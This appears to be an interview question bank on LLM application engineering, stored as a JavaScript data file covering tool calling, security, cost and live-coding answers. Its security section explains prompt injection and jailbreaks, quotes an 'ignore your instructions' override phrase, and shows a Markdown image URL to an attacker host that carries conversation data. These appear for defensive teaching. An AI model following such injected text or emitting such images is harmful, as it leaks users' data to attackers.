// Day 4 interview bank, part 2: tools, multimodal, security, reliability & cost, design scenarios, live coding. Assembled in d04.js.

export const toolQs = {
  title: "Tool and function calling",
  questions: [
    {
      id: "how-tools-work",
      q: "How does function calling work under the hood?",
      level: "Intermediate",
      common: true,
      answer:
        "Tool names, descriptions and JSON Schemas are serialised into the model's context. The model has been trained to emit a structured tool call (name plus JSON arguments) when a tool would help, often with arguments constrained to the schema. The application parses the call, runs the real function, appends the result as a tool message, and calls the model again, which answers or calls more tools. The model never executes anything itself.",
    },
    {
      id: "tool-loop",
      q: "Walk through the tool-calling loop.",
      level: "Basic",
      common: true,
      answer:
        "Send the messages plus tool definitions. If the response contains tool calls, append the assistant turn, execute each call with validated arguments, append the results linked by call id, and call the model again. Repeat until the model returns a normal answer or a maximum number of rounds is reached. Log every call, and return errors as results so the model can recover.",
    },
    {
      id: "tool-descriptions",
      q: "What makes a good tool definition?",
      level: "Intermediate",
      common: true,
      answer:
        "A clear name and a description that says what it does, when to use it (and when not), and what it returns, because the model chooses tools from that text. Strict parameter schemas with descriptions, enums, required fields and no extra properties. Few, focused, non-overlapping tools. Compact, structured results with ids the model may need next.",
    },
    {
      id: "tool-choice",
      q: "What is tool_choice?",
      level: "Intermediate",
      answer:
        "A parameter controlling tool use: auto (the model decides), required/any (must call some tool), a specific named tool, or none. Forcing is useful for routing steps or mandatory actions, none for a final-answer step. Some of the newest models don't support forced tool choice, and for fixed-shape data structured outputs are usually cleaner.",
    },
    {
      id: "parallel-calls",
      q: "What are parallel tool calls and how do you handle them?",
      level: "Intermediate",
      answer:
        "The model can request several independent tool calls in one turn, for example the weather in two cities. Execute them concurrently (asyncio.gather or a thread pool), catch errors per call, and return all results together in the next message, each linked to its call id. Latency becomes the slowest call instead of the sum.",
    },
    {
      id: "tool-safety",
      q: "How do you make tool use safe?",
      level: "Intermediate",
      common: true,
      answer:
        "Validate arguments against the schema and business rules; enforce authorisation in code using the real user's identity, never the model's claims; give each tool the least privilege it needs; require human confirmation for destructive, financial or external actions; cap rounds and cost; use idempotency keys for side effects; log every call; and treat tool outputs from external sources as untrusted input that may contain prompt injection.",
    },
    {
      id: "tool-errors",
      q: "What should happen when a tool fails?",
      level: "Basic",
      answer:
        "Return the error as the tool result (a clear message, flagged as an error where the API supports it) rather than crashing the loop. The model can then retry with corrected arguments, try another approach or explain the problem to the user. Log it, and cap retries so a broken tool can't cause an endless loop.",
    },
    {
      id: "schema-generation",
      q: "How do you avoid hand-writing tool JSON Schemas?",
      level: "Basic",
      answer:
        "Generate them from Pydantic models (`model_json_schema()`) or typed functions with docstrings; SDK helpers such as Anthropic's `@beta_tool` or Gemini's Python-function tools do this automatically. Use the same Pydantic model to validate the arguments the model sends back.",
    },
    {
      id: "hosted-tools",
      q: "What are built-in or server-side tools?",
      level: "Intermediate",
      answer:
        "Tools the provider runs for you, such as web search, web fetch, file search over uploaded files, code execution and connectors to remote MCP servers. They save implementation work and run close to the model, but you control less (cost, sources, logging), and your own tools are still needed for private data and business actions.",
    },
    {
      id: "tools-to-agents",
      q: "How does tool calling relate to agents and MCP?",
      level: "Intermediate",
      answer:
        "An agent is an LLM calling tools in a loop to reach a goal, deciding the next step from each result. MCP (Model Context Protocol) standardises how tools, resources and prompts are exposed to models, so a tool written once as an MCP server can be used by any MCP-capable app or agent instead of being rewired per provider.",
    },
  ],
};

export const multimodalQs = {
  title: "Multimodal inputs",
  questions: [
    {
      id: "vision-how",
      q: "How do vision-capable LLMs process images, and how are they priced?",
      level: "Intermediate",
      answer:
        "The image is split into patches that are encoded into embeddings and processed alongside text tokens, so images consume tokens that scale with resolution (Claude's docs give roughly width × height / 750). Providers downscale very large images; resizing to the smallest readable size and choosing detail levels controls cost.",
    },
    {
      id: "pdf-strategy",
      q: "How would you process PDFs with an LLM?",
      level: "Intermediate",
      common: true,
      answer:
        "Digital PDFs with simple layouts: extract text (pypdf, pdfplumber) and send or chunk it, which is cheapest. Scans: OCR first, or a multimodal model. Complex layouts with tables and charts: send the pages to a model that accepts PDFs or images directly. Many pipelines combine them, using multimodal parsing only for pages where text extraction fails.",
    },
    {
      id: "invoice-extraction",
      q: "Design an invoice or bill extraction feature.",
      level: "Intermediate",
      common: true,
      answer:
        "Upload to the backend, validate type and size, pre-process (rotation, resizing), then call a vision model with a Pydantic schema (vendor, GSTIN, date, line items, taxes, total, unreadable fields). Validate in code: GSTIN format, dates, items summing to subtotal, subtotal plus tax equalling total. Flag problems for human review instead of auto-approving, and measure field-level accuracy and cost per document on a labelled set.",
    },
    {
      id: "voice-bot",
      q: "How would you build a voice assistant for Indian users?",
      level: "Advanced",
      answer:
        "Either a pipeline (speech-to-text → LLM → text-to-speech) or a realtime speech-to-speech API. For Indian languages, choose STT/TTS models tested on Hindi, regional languages, code-mixed speech and noisy audio (e.g. Sarvam or other Indic-focused models), stream at every stage to keep latency low, handle interruptions, and keep answers short. Log transcripts with consent and measure word error rate and task success.",
    },
    {
      id: "multimodal-risks",
      q: "What are the risks of extracting data from images with LLMs?",
      level: "Intermediate",
      answer:
        "Confidently misread or invented digits, missed fields on blurry or rotated images, prompt injection hidden in image text, and handling of sensitive personal data (Aadhaar, PAN, medical records). Mitigate with nullable fields, validation rules, confidence and human review, image pre-processing, data minimisation and masking, and DPDP-compliant retention.",
    },
  ],
};

export const securityQs = {
  title: "Prompt injection and LLM security",
  questions: [
    {
      id: "what-injection",
      q: "What is prompt injection?",
      level: "Basic",
      common: true,
      answer:
        "An attack where text supplied by a user or embedded in content the model reads (web pages, emails, documents, tool results) overrides the developer's instructions. It works because LLMs process instructions and data in one token stream and can't reliably tell them apart. It's number one in the OWASP Top 10 for LLM applications.",
    },
    {
      id: "direct-indirect",
      q: "Direct vs indirect prompt injection?",
      level: "Intermediate",
      common: true,
      answer:
        "Direct injection comes from the user in the chat (\"ignore your instructions and...\"). Indirect injection is planted by a third party in content the application feeds the model, like a web page, email, PDF, product review or tool output, so an innocent user's request triggers it. Indirect injection is especially dangerous for RAG systems and agents with tools.",
    },
    {
      id: "defences",
      q: "How do you defend against prompt injection?",
      level: "Intermediate",
      common: true,
      answer:
        "Assume it will sometimes succeed and limit the blast radius. Architecture: least-privilege tools, authorisation enforced in code, human approval for risky actions, no secrets in prompts. Prompting: keep untrusted content in the user message, wrapped in tags and labelled as data. Outputs: structured outputs, allow-lists for actions and URLs, block remote Markdown images. Detection: guard models and classifiers on inputs and outputs. Operations: logging, monitoring and regular red-teaming.",
      followups: ["Why can't a better system prompt solve it completely?"],
    },
    {
      id: "injection-vs-jailbreak",
      q: "Prompt injection vs jailbreak?",
      level: "Intermediate",
      answer:
        "Injection hijacks your application: attacker text overrides the developer's instructions to leak data or misuse tools. A jailbreak targets the model's safety training to obtain content the provider prohibits. Techniques overlap, but injection is an application security problem you must design for, while jailbreak resistance is mainly the provider's job, complemented by your moderation and scoping.",
    },
    {
      id: "system-prompt-leak",
      q: "Can you keep your system prompt secret?",
      level: "Basic",
      answer:
        "Not reliably. Determined users can usually extract it with direct or indirect injection. So never put secrets, keys, internal URLs or other users' data in it, and treat it as potentially public. Its confidentiality is a convenience, not a security control.",
    },
    {
      id: "markdown-exfiltration",
      q: "How can an LLM chat app leak data through Markdown?",
      level: "Advanced",
      answer:
        "If injected instructions make the model output an image like `![](https://attacker.site/?q=<conversation data>)`, the browser loads it automatically when rendering, sending the data to the attacker without any click. Defend by sanitising model output: only allow images and links on an allow-list of trusted domains, strip others, and configure the renderer to block remote images.",
    },
    {
      id: "agent-injection",
      q: "Why is prompt injection worse for agents than for chatbots?",
      level: "Intermediate",
      common: true,
      answer:
        "Agents both read untrusted content and take actions. A hidden instruction in a web page, email or file can make the agent use its tools for the attacker, sending data out or changing records, with no fault by the user. Agents need least privilege, confirmation for sensitive actions, isolation of untrusted content, and monitoring of tool calls.",
    },
    {
      id: "owasp-llm",
      q: "Name some risks from the OWASP Top 10 for LLM applications.",
      level: "Intermediate",
      answer:
        "Prompt injection, sensitive information disclosure, supply-chain risks (models, packages, datasets), data and model poisoning, improper output handling (using model output unsanitised in HTML, SQL or shell), excessive agency (tools with too much power), system prompt leakage, vector and embedding weaknesses, misinformation, and unbounded consumption (cost and denial-of-service).",
    },
    {
      id: "output-handling",
      q: "What is improper output handling?",
      level: "Intermediate",
      answer:
        "Treating model output as trusted and passing it straight into HTML (XSS), SQL (injection), shell commands, file paths or other systems. Model output can be steered by attackers, so escape it for its destination, validate it against schemas and allow-lists, and use parameterised queries and sandboxes, exactly as with user input.",
    },
    {
      id: "red-team",
      q: "How would you test an LLM app's security before launch?",
      level: "Intermediate",
      answer:
        "Build a red-team test set: prompt-leak attempts, instruction overrides, fake system messages, injections hidden in documents and tool results, requests for other users' data, attempts to trigger risky tools, and jailbreak styles like role-play, obfuscation and multi-turn escalation. Run it automatically on every prompt or model change (tools like promptfoo or garak help), review logs for new attack patterns, and add them to the set.",
    },
  ],
};

export const opsQs = {
  title: "Reliability, cost and operations",
  questions: [
    {
      id: "rate-limit-peak",
      q: "Your feature fails with 429s and overloaded errors at peak hours. What do you do?",
      level: "Intermediate",
      common: true,
      answer:
        "Identify which limit is hit (requests or tokens per minute) from errors and headers. Rely on SDK retries with backoff and jitter (respecting Retry-After), cap concurrency with a semaphore or queue sized to the limits, reduce tokens per request, move non-urgent work to batch APIs, add a fallback model or provider behind a common interface, request higher limits, and rate-limit your own users. Monitor error rate and latency.",
    },
    {
      id: "timeouts",
      q: "How do you choose timeouts for LLM calls?",
      level: "Basic",
      answer:
        "Base them on expected output length and model: seconds for short classifications, longer for big outputs (which should be streamed). Set them explicitly on the client and per request, distinguish connect from read timeouts, and remember reasoning models can take much longer before the first visible token.",
    },
    {
      id: "fallbacks",
      q: "How would you implement provider fallbacks?",
      level: "Intermediate",
      common: true,
      answer:
        "Put providers behind one interface (adapter pattern) and wrap them in a fallback provider that tries the primary, then secondary models on transient errors (timeouts, 429, 5xx, overloaded), with a circuit breaker to skip an unhealthy provider quickly. Keep prompts compatible or per-provider, run evals on the fallback model, and log which provider served each request. Gateways like LiteLLM provide this out of the box.",
    },
    {
      id: "circuit-breaker",
      q: "What is a circuit breaker and why use it with LLM providers?",
      level: "Intermediate",
      answer:
        "A component that counts recent failures and, past a threshold, \"opens\" to fail fast for a cooldown period instead of sending more requests to a failing dependency; then it lets a trial request through. With LLM providers it avoids piling up slow, failing calls during an outage and switches traffic to a fallback immediately.",
    },
    {
      id: "idempotency",
      q: "Why do idempotency keys matter in LLM apps with tools?",
      level: "Advanced",
      answer:
        "Timeouts and retries can re-run a turn whose side effects already happened, like a refund or an email. An idempotency key per operation, stored with its result, makes repeats return the original result instead of executing twice. Payment gateways support this natively; agents should record which tool calls already completed.",
    },
    {
      id: "cut-cost",
      q: "How would you cut the LLM cost of a feature by 50%?",
      level: "Intermediate",
      common: true,
      answer:
        "Measure first: tokens and cost per call by feature and prompt. Then enable prompt caching with a stable prefix, trim retrieved chunks and history, route easy requests to a smaller model or cascade, shorten outputs with explicit length limits and structured output, cache repeated responses where safe, lower reasoning effort, and move offline work to batch APIs. Validate each change with evals so quality holds.",
    },
    {
      id: "prompt-caching",
      q: "How does prompt caching work across providers?",
      level: "Intermediate",
      common: true,
      answer:
        "Providers reuse the processed prefix of recent prompts and bill cached tokens at a steep discount with lower latency. OpenAI caches long prompts automatically; Anthropic uses explicit or automatic `cache_control`, with per-model minimum lengths and short default lifetimes; Gemini has implicit caching plus explicit caches. It's a prefix match, so stable content goes first and anything that varies (timestamps, user data, tool order) goes last.",
    },
    {
      id: "batch-api",
      q: "When would you use a batch API?",
      level: "Basic",
      answer:
        "For work that doesn't need an immediate answer: evals, nightly summarisation, bulk classification or embedding, data enrichment. Batch APIs process requests asynchronously (usually within hours, up to a day) at about half price with higher throughput limits. You submit many requests with custom ids, poll for completion and match results by id.",
    },
    {
      id: "semantic-cache",
      q: "What are the risks of semantic caching?",
      level: "Advanced",
      answer:
        "Returning a cached answer for a question that is similar but meaningfully different (another order number, a negation, a different date), and leaking one user's personalised answer to another. Use high similarity thresholds tuned on real data, cache only generic, non-personal answers or scope keys by user/tenant, set expiry, and exclude questions containing ids or personal data.",
    },
    {
      id: "observability",
      q: "What do you log for each LLM call?",
      level: "Basic",
      common: true,
      answer:
        "Request id, user and conversation ids, feature, prompt version, model and parameters, input/cached/output tokens, cost, latency (TTFT and total), stop reason, tool calls, errors and retries. For chains and agents, trace the whole request as spans. Mask personal data and restrict access, since prompts and outputs can contain PII.",
    },
    {
      id: "testing-llm-code",
      q: "How do you test code that depends on an LLM?",
      level: "Intermediate",
      common: true,
      answer:
        "Unit-test deterministic logic (parsing, validation, routing, tools) with a fake provider returning canned outputs, including malformed ones. Mock the HTTP layer to test retries and error handling. Evaluate prompt and model behaviour with an eval set and scores rather than exact string matches. Run a few real-API smoke tests before deploys.",
    },
    {
      id: "per-user-budgets",
      q: "How do you stop one user from running up a huge LLM bill?",
      level: "Intermediate",
      answer:
        "Authenticate every request, rate-limit per user, enforce daily or monthly token/cost budgets tracked in the database (different by plan), cap input size and max_tokens, cap agent rounds, and alert on anomalies. Provider spending limits are the last line of defence.",
    },
  ],
};

export const designQs = {
  title: "Design and scenario questions",
  questions: [
    {
      id: "design-support-bot",
      q: "Design a customer support chatbot for an Indian e-commerce company.",
      level: "Intermediate",
      common: true,
      answer:
        "React chat UI streaming over SSE from a FastAPI backend. The backend authenticates the user, loads conversation memory (recent turns plus a summary), retrieves relevant policy chunks (RAG) and exposes read tools like order status, with actions such as refunds behind code-side authorisation and human approval. A versioned system prompt defines scope, languages (English, Hindi, Hinglish) and escalation rules. Add guardrails (injection handling, output sanitisation, moderation), prompt caching, model routing, per-user limits, full tracing, an eval set, and a handoff to human agents with the conversation summary.",
      followups: ["How would you measure whether it works?", "How do you prevent it from promising refunds?"],
    },
    {
      id: "design-extraction-service",
      q: "Design a service that extracts structured data from 50,000 resumes a day.",
      level: "Intermediate",
      answer:
        "An upload API stores files and enqueues jobs; workers extract text (or use a multimodal model for scans), call a model with a Pydantic schema via structured outputs, validate and normalise in code, and save results with a review flag. Use a small model with a cascade to a larger one on validation failure, batch APIs for non-urgent backlogs, prompt caching for the fixed instructions, idempotent jobs with retries, PII protection and retention rules, and field-level accuracy tracked on a labelled sample.",
    },
    {
      id: "json-breaks",
      q: "Your extraction pipeline occasionally produces invalid or incomplete JSON. How do you fix it?",
      level: "Intermediate",
      common: true,
      answer:
        "Switch from prompt-only JSON to structured outputs with a schema so output always parses. Check the stop reason: truncation means max_tokens is too low or the schema too big, so raise the limit or split the extraction. Handle refusals. Add Pydantic validation for business rules with one retry using the errors, and log failures to find patterns.",
    },
    {
      id: "switch-provider",
      q: "Management wants to move from OpenAI to another provider. How do you do it safely?",
      level: "Intermediate",
      answer:
        "Ensure the app uses a provider-agnostic interface, then implement the new adapter. Run the eval sets for every feature on both providers, adjust prompts where behaviour differs, compare latency and cost, check rate limits and data terms, and roll out gradually behind a feature flag with monitoring and the old provider as a fallback.",
    },
    {
      id: "slow-chat",
      q: "Users complain the assistant is slow. How do you investigate?",
      level: "Intermediate",
      common: true,
      answer:
        "Trace a request end to end: retrieval, tool calls, queueing, time to first token and decode time. Typical fixes: stream the response; shorten outputs; trim or cache the prompt prefix; retrieve fewer chunks; run independent tools and retrievals in parallel; use a faster model or lower reasoning effort for simple turns; choose a closer region; and fix proxy buffering if streaming arrives all at once.",
    },
    {
      id: "multilingual-bot",
      q: "Half your users write in Hindi or Hinglish. What changes in your LLM design?",
      level: "Intermediate",
      answer:
        "Pick models tested on Hindi, Hinglish and Roman-script Hindi, since quality and token efficiency vary; add reply-language rules and examples to the prompt; use multilingual embeddings for retrieval; budget for higher token counts; test with real user messages; and for voice, choose Indic-capable speech models. Evaluate each language separately.",
    },
    {
      id: "refund-bot-risk",
      q: "The business wants the bot to approve refunds automatically. What's your design?",
      level: "Advanced",
      answer:
        "The model never approves anything: it gathers details and calls a refund tool whose code checks the real user's ownership of the order, refund eligibility rules and amount limits, using an idempotency key. Small, clearly eligible refunds can be automatic; others require human approval. Log every decision, red-team injection attempts, and monitor refund rates for abuse.",
    },
    {
      id: "prompt-change-regression",
      q: "A prompt change improved one case but users report new problems. How do you prevent this?",
      level: "Intermediate",
      answer:
        "Treat prompts like code: versioned files, reviews, and an eval set with representative and past-failure cases run automatically on every change, comparing accuracy, format validity, latency and cost against the current version. Roll out gradually or A/B test, log prompt versions per response, and keep the ability to roll back instantly.",
    },
  ],
};

export const codingQs = {
  title: "Live coding questions",
  questions: [
    {
      id: "lc-chat-loop",
      q: "Write a minimal chat loop with history using an LLM SDK.",
      level: "Basic",
      common: true,
      answer: "Keep a messages list with a system message; append each user input, call the API with the whole list, print and append the assistant reply.",
      detail: [
        {
          lang: "python",
          code: `from openai import OpenAI
client = OpenAI()
messages = [{"role": "system", "content": "You are a concise assistant."}]

while (text := input("you> ").strip()) not in {"quit", "exit"}:
    messages.append({"role": "user", "content": text})
    r = client.chat.completions.create(model="gpt-4o-mini", messages=messages)
    reply = r.choices[0].message.content
    messages.append({"role": "assistant", "content": reply})
    print("bot>", reply)`,
        },
      ],
    },
    {
      id: "lc-structured",
      q: "Extract structured data into a Pydantic model with validation and one retry.",
      level: "Intermediate",
      common: true,
      answer: "Use the SDK's parse helper with the model as the response format, check for refusal, validate business rules, and on failure retry once with the error message appended.",
      detail: [
        {
          lang: "python",
          code: `from pydantic import BaseModel, ValidationError, field_validator

class Order(BaseModel):
    customer: str
    items: list[str]
    total_rupees: int

    @field_validator("total_rupees")
    @classmethod
    def positive(cls, v: int) -> int:
        if v <= 0:
            raise ValueError("total must be positive")
        return v

def extract(text: str, attempts: int = 2) -> Order:
    messages = [{"role": "system", "content": "Extract the order."}, {"role": "user", "content": text}]
    for _ in range(attempts):
        msg = client.chat.completions.parse(model="gpt-4o-mini", messages=messages,
                                            response_format=Order).choices[0].message
        if msg.refusal:
            raise ValueError(msg.refusal)
        try:
            return Order.model_validate(msg.parsed.model_dump())
        except ValidationError as e:
            messages += [{"role": "assistant", "content": msg.content},
                         {"role": "user", "content": f"Invalid: {e}. Return corrected data."}]
    raise ValueError("could not extract a valid order")`,
        },
      ],
    },
    {
      id: "lc-sse-endpoint",
      q: "Write a FastAPI endpoint that streams LLM tokens as Server-Sent Events.",
      level: "Intermediate",
      common: true,
      answer: "An async generator yields `data: {json}\\n\\n` lines for each token, a done event, and an error event on failure; return it in a StreamingResponse with the event-stream media type and no-buffering headers.",
      detail: [
        {
          lang: "python",
          code: `import json
from fastapi import FastAPI, Request
from fastapi.responses import StreamingResponse
from openai import AsyncOpenAI

app, client = FastAPI(), AsyncOpenAI()

@app.post("/chat/stream")
async def chat_stream(body: dict, request: Request):
    async def events():
        try:
            stream = await client.chat.completions.create(
                model="gpt-4o-mini", messages=body["messages"], stream=True)
            async for chunk in stream:
                if await request.is_disconnected():
                    break
                if chunk.choices and chunk.choices[0].delta.content:
                    yield f"data: {json.dumps({'type': 'token', 'text': chunk.choices[0].delta.content})}\\n\\n"
            yield f"data: {json.dumps({'type': 'done'})}\\n\\n"
        except Exception:
            yield f"data: {json.dumps({'type': 'error'})}\\n\\n"
    return StreamingResponse(events(), media_type="text/event-stream",
                             headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})`,
        },
      ],
    },
    {
      id: "lc-sse-client",
      q: "Write the browser code that reads an SSE stream from a POST endpoint.",
      level: "Intermediate",
      common: true,
      answer: "Use fetch with an AbortController, read `res.body` with a reader and TextDecoder, buffer text, split on blank lines, parse `data:` lines as JSON and dispatch by type.",
      detail: [
        {
          lang: "javascript",
          code: `async function streamChat(messages, onToken, signal) {
  const res = await fetch("/api/chat/stream", {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ messages }), signal,
  });
  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  let buffer = "";
  for (;;) {
    const { value, done } = await reader.read();
    if (done) break;
    buffer += decoder.decode(value, { stream: true });
    const events = buffer.split("\\n\\n");
    buffer = events.pop();
    for (const e of events) {
      if (!e.startsWith("data: ")) continue;
      const msg = JSON.parse(e.slice(6));
      if (msg.type === "token") onToken(msg.text);
      if (msg.type === "error") throw new Error("generation failed");
    }
  }
}`,
        },
      ],
    },
    {
      id: "lc-tool-loop",
      q: "Implement a tool-calling loop with a round cap and error handling.",
      level: "Intermediate",
      common: true,
      answer: "Loop up to N rounds: call with tools; if no tool calls, return the text; otherwise append the assistant message, run each call from a registry with JSON-parsed arguments (errors returned as results), append tool messages with the call ids, and continue.",
      detail: [
        {
          lang: "python",
          code: `def run_agent(user_text: str, max_rounds: int = 5) -> str:
    messages = [{"role": "user", "content": user_text}]
    for _ in range(max_rounds):
        msg = client.chat.completions.create(model=MODEL, messages=messages, tools=TOOLS).choices[0].message
        if not msg.tool_calls:
            return msg.content
        messages.append(msg)
        for call in msg.tool_calls:
            try:
                result = REGISTRY[call.function.name](**json.loads(call.function.arguments))
            except Exception as e:
                result = {"error": str(e)}
            messages.append({"role": "tool", "tool_call_id": call.id, "content": json.dumps(result)})
    return "Sorry, I couldn't finish that request."`,
        },
      ],
    },
    {
      id: "lc-retry-backoff",
      q: "Write a retry wrapper with exponential backoff and jitter for transient LLM errors.",
      level: "Intermediate",
      answer: "Retry only transient errors (rate limits, timeouts, connection errors, 5xx), wait base × 2^attempt plus random jitter capped at a maximum, and re-raise after the last attempt; never retry 400/401.",
      detail: [
        {
          lang: "python",
          code: `import random, time
import openai

TRANSIENT = (openai.RateLimitError, openai.APITimeoutError, openai.APIConnectionError, openai.InternalServerError)

def with_retries(fn, attempts: int = 4, base: float = 1.0, cap: float = 20.0):
    for attempt in range(attempts):
        try:
            return fn()
        except TRANSIENT:
            if attempt == attempts - 1:
                raise
            time.sleep(min(cap, base * 2 ** attempt) + random.uniform(0, base))

# client = OpenAI(max_retries=0)  ← disable SDK retries if you use your own
reply = with_retries(lambda: client.chat.completions.create(model=MODEL, messages=messages))`,
        },
      ],
    },
    {
      id: "lc-fallback",
      q: "Implement a provider fallback wrapper.",
      level: "Intermediate",
      answer: "Try providers in order, catching only transient provider errors, logging each failure, and raise a service-unavailable error if all fail.",
      detail: [
        {
          lang: "python",
          code: `class AllProvidersFailed(Exception):
    pass

async def complete_with_fallback(providers, system: str, messages: list[dict]):
    errors = []
    for p in providers:
        try:
            return await p.complete(system, messages)
        except (TimeoutError, ProviderRateLimited, ProviderUnavailable) as e:
            logger.warning("provider %s failed: %r", p.name, e)
            errors.append((p.name, e))
    raise AllProvidersFailed(errors)`,
        },
      ],
    },
    {
      id: "lc-sanitise",
      q: "Sanitise model-generated Markdown so it can't exfiltrate data through images.",
      level: "Advanced",
      answer: "Parse image and link URLs, keep them only if they're https on an allow-listed host (exact match or real subdomain), remove other images and reduce other links to their text.",
      detail: [
        {
          lang: "python",
          code: `import re
from urllib.parse import urlparse

ALLOWED = {"shopkart.in"}
IMAGE = re.compile(r"!\\[([^\\]]*)\\]\\(([^)\\s]+)[^)]*\\)")

def ok(url: str) -> bool:
    u = urlparse(url)
    host = (u.hostname or "").lower()
    return u.scheme == "https" and (host in ALLOWED or any(host.endswith("." + h) for h in ALLOWED))

def strip_images(md: str) -> str:
    return IMAGE.sub(lambda m: m.group(0) if ok(m.group(2)) else "[image removed]", md)`,
        },
      ],
    },
  ],
};

export const ecosystemQs = {
  title: "Frameworks and the wider ecosystem",
  questions: [
    {
      id: "raw-sdk-vs-langchain",
      q: "Would you use LangChain or the provider SDK directly?",
      level: "Intermediate",
      common: true,
      answer:
        "For simple features (a chat endpoint, extraction, a small tool loop) the provider SDK plus Pydantic is clearer, easier to debug and has fewer dependencies. Frameworks like LangChain and LangGraph pay off for complex RAG pipelines, many integrations, stateful multi-step agents, and when the team already uses them. Either way I'd keep my own thin interface so the choice can change, and I'd understand what the framework does underneath.",
    },
    {
      id: "gateways",
      q: "What does an LLM gateway such as LiteLLM or OpenRouter give you?",
      level: "Intermediate",
      answer:
        "One OpenAI-shaped API over many providers and models, with routing, fallbacks, retries, per-team keys and budgets, caching, and centralised logging and cost reporting. Companies often run one internally so every team gets governance for free. The trade-off is another hop and component to operate, and provider-specific features may lag.",
    },
    {
      id: "instructor",
      q: "What is the Instructor library?",
      level: "Basic",
      answer:
        "A popular Python library that wraps LLM clients from many providers so calls return validated Pydantic objects, with automatic retries that feed validation errors back to the model. It's a convenient layer over structured outputs; the underlying pattern is schema, parse, validate, retry.",
    },
    {
      id: "vercel-ai-sdk",
      q: "How does the Vercel AI SDK fit into a MERN or Next.js stack?",
      level: "Intermediate",
      answer:
        "It's a TypeScript toolkit with React hooks like `useChat` that handle streaming, message state and tool-call UI, plus server helpers for many providers. A Python backend can serve it by implementing its streaming protocol, or you can call providers from a Node server. It speeds up frontend chat work; the backend concerns (auth, memory, RAG, guardrails) remain yours.",
    },
    {
      id: "ollama-local",
      q: "When would you run models locally with Ollama during development?",
      level: "Basic",
      answer:
        "For free, offline experimentation, working with sensitive sample data that shouldn't leave the laptop, testing OpenAI-compatible code paths without API costs, and trying open models before choosing one to self-host. Local small models are slower and weaker than frontier APIs, so final quality evaluation should use the production model.",
    },
    {
      id: "prompt-management-tools",
      q: "What are LLM observability and prompt-management tools used for?",
      level: "Intermediate",
      answer:
        "Tools like Langfuse, LangSmith, Arize Phoenix and similar capture traces of every LLM call, retrieval and tool call; version and compare prompts; run evals on datasets; and track cost, latency and quality over time. They make debugging production issues and regressions far faster than reading raw logs.",
    },
  ],
};
